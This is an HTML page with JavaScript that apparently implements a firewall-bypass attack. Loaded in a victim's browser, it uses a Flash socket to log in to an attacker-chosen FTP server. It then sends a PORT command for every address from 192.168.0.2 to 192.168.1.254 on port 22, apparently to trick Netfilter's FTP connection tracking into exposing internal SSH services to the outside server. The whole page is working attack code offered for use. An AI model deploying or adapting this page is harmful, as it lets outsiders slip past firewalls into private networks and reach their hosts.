<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
	<!--
		This code is in the public domain, furnished "as is", without technical
		support, and with no warranty, express or implied, as to its usefulness
		for any purpose.

		Author: Tsisyk Roman
	-->
	<head>
		<title>Netfilter pass-through techniquie</title>
		<meta http-equiv="Content-type" content="text/html;charset=UTF-8" />
		<script src="swfobject.js" type="text/javascript"></script>
		<script src="jsocket.js" type="text/javascript"></script>
	</head>

	<body>
		<div id="my_socket"></div>

		<script type="text/javascript">
			var stateEnum = { AuthUser: 0, AuthPass: 1, TryPort:2, Quit:3, Finish: 4 };

			// your server ip
			var serverIP = "y.y.y.y";
			var victimPort = 22;

			// 192.168.0.2
			var curIP = 3232235522;
			// 192.168.1.254
			var endIP = 3232236030;

			// current fsm state
			var state = stateEnum.AuthUser;

			function ready() {
				mySocket.connect(serverIP, 21);
			}

			/*
				Makes 192,168,0,1,23,22 string in PORT cmd
			*/
			function makePortString(ip, port) {
				return String((ip >> 24) & 0xff) + ','
									 + String((ip >> 16) & 0xff) + ','
									 + String((ip >> 8) & 0xff) + ','
									 + String(ip & 0xff) + ','
									 + String(port >> 8) + ','
									 + String(port & 0xff);
			}

			/*
				Called then data was arrived
			*/
			function data(content) {
				/* simple fsm */
				switch(state) {
					case stateEnum.AuthUser:
					{
						mySocket.write("USER anonymous\r\n");
						state = stateEnum.AuthPass;
						break;
					}
					case stateEnum.AuthPass:
					{
						mySocket.write("PASS test@example.com\r\n");
						state = stateEnum.TryPort;
						break;
					}
					case stateEnum.TryPort:
					{
						// check if we should stop working
						if(curIP > endIP)
							state = stateEnum.Quit;

						// make port command
						var cmd = 'PORT ' + makePortString(curIP, victimPort) + '\r\n';
						mySocket.write(cmd);

						curIP++;
						break;
					}
					case stateEnum.Quit:
					{
						mySocket.write("QUIT\r\n");
						state = stateEnum.Finish;
						break;
					}
					default: // stateEnum.Finish
						return;
				}
			}

			var mySocket = new jSocket(ready, null, data, null);
			mySocket.setup("my_socket", "jsocket.swf");
		</script>
	</body>

</html>